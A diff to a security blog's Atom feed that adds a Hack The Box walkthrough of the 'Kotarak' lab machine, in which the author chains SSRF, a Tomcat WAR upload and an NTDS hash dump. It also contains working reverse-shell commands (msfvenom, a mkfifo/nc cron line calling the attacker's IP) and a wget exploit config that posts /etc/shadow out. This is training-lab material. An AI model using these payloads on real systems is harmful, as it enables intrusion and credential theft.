@@ -1,4 +1,348 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-04-28T00:35:43+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Holiday - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-holiday/" rel="alternate" type="text/html" title="Holiday - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-holiday</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-holiday/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-04-29T23:36:26+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Kotarak - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-kotarak/" rel="alternate" type="text/html" title="Kotarak - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-kotarak</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-kotarak/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kotarak was a hard box with a SSRF through a form on a webpage that allow us to retrieve the credentials from a backup files. We can login on Apache Tomcat and upload a .RAW reverse shell to get an entry point with the webserver user Tomcat. We will find 2 important NTDS files where we can extract the hashes with the impacket tool secretsdump.py cracking the Administrator’s hash and elevate as Atanas. For the privesc we got a wget version vulnerable and a crontab that download some archivie files from another subnet, with a wget vulnerable too.&lt;/p&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can perform a SSRF through a website’s browsable from for retrieving the credentials for Tomcat.&lt;/li&gt;
+  &lt;li&gt;Now we can use those credentials to access the website and upload a reverse shell.&lt;/li&gt;
+  &lt;li&gt;With secretsdump.py from impacket tools we can retrieve the Administrator’s hash password to elevate as Atanas.&lt;/li&gt;
+  &lt;li&gt;A crontab from another subnet allows us to detect a vulnerable version of wget on the machine in the subnet and on the local machine.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;
+
+&lt;p&gt;We discover on the remote host 3 open TCP ports:  22 SSH, 8009 Apache Jserv and 8080 Apache Tomcat&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.55
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 23:35 CEST
+Nmap scan report for 10.10.10.55
+Host is up (0.051s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
+|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
+|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
+|   Potentially risky methods: PUT DELETE
+|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
+8080/tcp open  http    Apache Tomcat 8.5.5
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Apache Tomcat/8.5.5 - Error report
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -T4 -p- 10.10.10.55
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 23:39 CEST
+Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 84.75% done; ETC: 23:39 (0:00:03 remaining)
+Nmap scan report for 10.10.10.55
+Host is up (0.054s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+8009/tcp  open  ajp13
+8080/tcp  open  http-proxy
+60000/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;http-recon&quot;&gt;HTTP Recon&lt;/h2&gt;
+
+&lt;p&gt;We get a 404 error if we try to connect on the ip with the 8080 tomcat tcp port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the 60000 tcp open port instead we can able to connect on the website.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;server-side-request-forgery&quot;&gt;Server Side Request Forgery&lt;/h2&gt;
+
+&lt;p&gt;Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;capturing the request for private browsing through the browser provided by the website with burpsuite, we can notice a rather curious form:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Testing the form with sqlmap it appears not vulnerable to sql injections. But by trying an SSRF attack we discover the magic:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can request remote resources, in this case the tomcat page hosted on port 8080 by the webserver. Unfortunately, by trying to request remote files, we don’t have the same luck. So we can see if the remote server has other resources available on other ports that only himself reaches:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo examples -&amp;gt; wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
+Total requests: 65535
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                         
+===================================================================
+
+000000022:   200        4 L      4 W      62 Ch       &quot;22&quot;                                            
+000000090:   200        11 L     18 W     156 Ch      &quot;90&quot;                                            
+000000110:   200        17 L     24 W     187 Ch      &quot;110&quot;                                           
+000000200:   200        3 L      2 W      22 Ch       &quot;200&quot;                                           
+000000320:   200        26 L     109 W    1232 Ch     &quot;320&quot;                                           
+000000888:   200        78 L     265 W    3955 Ch     &quot;888&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To speed up this step, the interesting door is the 888:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can ask the server to show us the backup file on port 888:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The only CTF like part that we could find in this machine. Obviously I don’t reserve any criticism because the box was really well made and full of new stuff to learn. Let’s authenticate to tomcat now!&lt;/p&gt;
+
+&lt;h2 id=&quot;tomcat-recon&quot;&gt;Tomcat Recon&lt;/h2&gt;
+
+&lt;p&gt;Browsing the page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.55:8080/manager/html&lt;/code&gt; a window will appear and we can enter the credentials just found.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The cool thing is that we can deploy a file with the WAR web archive.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And since tomcat can interpret java, we are going to create a reverse shell in java with msfvenom:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f war &amp;gt; /root/Documenti/kotarak/shell.war
+Payload size: 1100 bytes
+Final size of war file: 1100 bytes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And finally we will trigger it through the broswer:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 38164
+id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; pwd
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+tomcat
+/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-atanas&quot;&gt;PrivEsc to Atanas&lt;/h2&gt;
+
+&lt;p&gt;There is an user called Atanas in the system:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+atanas:x:1000:1000:atanas,,,:/home/atanas:/bin/bash
+tomcat:x:1001:1001::/opt/tomcat:/bin/false
+mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
+lxc-dnsmasq:x:112:119:LXC dnsmasq,,,:/var/lib/lxc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And after a bit of enumeration of the file system, in the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/tomcat/to_archive/pentest_data&lt;/code&gt; we find a couple of interesting files:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /home
+$ cd tomcatt
+$ cd to_archive
+$ cd pentest_data
+$ ls
+20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dit&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bin&lt;/code&gt; file are look to be AD database files.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-the-file-ntdsdit&quot;&gt;What is the file ntds.dit?&lt;/h2&gt;
+
+&lt;p&gt;The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.&lt;/p&gt;
+
+&lt;p&gt;To use the tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; from impacket to dump the hashes, we need to download the files to our machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; download 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+[*] download   : 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -&amp;gt; 20170721114636_default_192.168.110.133_psexec.ntdsg
+meterpreter &amp;gt; download 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+[*] download   : 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -&amp;gt; 20170721114637_default_192.168.110.133_psexec.ntdsg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s rename the files:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; ls
+ntds.bin
+ntds.dit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we dump the content with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket&lt;/code&gt; tool:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; impacket-secretsdump -ntds ntds.dit -system ntds.bin LOCAL
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
+WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
+WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
+WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
+WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
+atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The hash that we need to elevate to Atanos is that of the administrator.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f16tomcat!&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ su atanas
+su atanas
+Password: f16tomcat!
+
+atanas@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ cat /home/atanas/user.txt
+&amp;lt;mcat/to_archive/pentest_data$ cat /home/atanas/user.txt                     
+93f844f50491ef797c9c1b601b4bece8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;
+
+&lt;p&gt;Browsing the file system with Atanas, we notice two singularly interesting things:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ ls
+app.log  flag.txt
+atanas@kotarak-dmz:/root$ cat flag.txt
+Getting closer! But what you are looking for can't be found here.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And this one:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ cat app.log
+10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
+10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
+10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;App.log is as it gives us some of information: It shows that an IP of 10.0.3.133 utilises GET every 2 minutes to call a file called archive.tar.gz and the vulnerable version of wget. When looking at the content of ifconfig, it shows that we are also connected to the 10.0.3.0/24 network via a LXC bridge port with the IP address of 10.0.3.1, this indicates that the 10.0.3.133 is running in an LXC container with a vulnerable version of wget.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets also check the wget version of our machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ wget -V
+GNU Wget 1.17.1 built on linux-gnu.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Our version of wget is also vulnerable!&lt;/p&gt;
+
+&lt;h2 id=&quot;wget-exploiting&quot;&gt;Wget exploiting&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://www.exploit-db.com/exploits/40064&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Wget &amp;lt; 1.18 when supplied with a malicious URL (to a malicious or compromised web server) can be tricked into saving an arbitrary remote file supplied by an attacker, with arbitrary contents and filename under the current directory and possibly other directories by writing to .wgetrc.&lt;/p&gt;
+
+&lt;p&gt;First, let’s collect both .wgetrc and exploit.py files:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo exp -&amp;gt; ls -lah
+totale 16K
+drwxr-xr-x 2 root root 4,0K apr 29 05:25 .
+drwxr-xr-x 3 root root 4,0K apr 29 01:56 ..
+-rw-r--r-- 1 root root 2,8K apr 29 02:31 exp.py
+-rw-r--r-- 1 root root   70 apr 29 02:13 .wgetrc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;let’s adapt them to the our case:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo exp -&amp;gt; cat .wgetrc
+post_file = /etc/shadow
+output_document = /etc/cron.d/wget-root-shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And copy the exploit.py script from the exploit-db page to our machine and edit it accordingly::&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ROOT_CRON&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;* * * * * root rm /tmp/i;mkfifo /tmp/i;cat /tmp/i|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &amp;gt;/tmp/i &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we need to install and run the python ftp with this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip install pyftpdlib&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Download the exploit.py previously adapted to our case in the remote machine, and run it with this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ authbind python exp.py
+Ready? Is your FTP server running?
+FTP found open on 10.10.14.27:21. Let's go then
+
+Serving wget exploit on port 80...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Any port below 1024 requires root access to run unless authbind is used. Authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. Authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.&lt;/p&gt;
+
+&lt;p&gt;And when the crontab run (every two minutes) we will get back our root reverse shell!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4445
+listening on [any] 4444 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 45718
+/bin/sh: 0: can't access tty: job control turned off
+# id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat root/root.txt
+uid=0(root) gid=0(root) groups=0(root)
+root950d1425795dfd38272c93ccbb63ae2c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;hack-for-fun-and-learning-not-for-profit&quot;&gt;Hack for fun and learning. Not for profit&lt;/h2&gt;
+
+&lt;p&gt;Unfortunately we getting a root shell inside another machine, and the user Atanas can’t edit the webserver files owned by root!&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Kotarak" /><category term="SSRF" /><category term="NTDS files" /><category term="WGET Vulnerable" /><summary type="html">Kotarak was a hard box with a SSRF through a form on a webpage that allow us to retrieve the credentials from a backup files. We can login on Apache Tomcat and upload a .RAW reverse shell to get an entry point with the webserver user Tomcat. We will find 2 important NTDS files where we can extract the hashes with the impacket tool secretsdump.py cracking the Administrator's hash and elevate as Atanas. For the privesc we got a wget version vulnerable and a crontab that download some archivie files from another subnet, with a wget vulnerable too.</summary></entry><entry><title type="html">Holiday - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-holiday/" rel="alternate" type="text/html" title="Holiday - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-holiday</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-holiday/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.&lt;/p&gt;
 
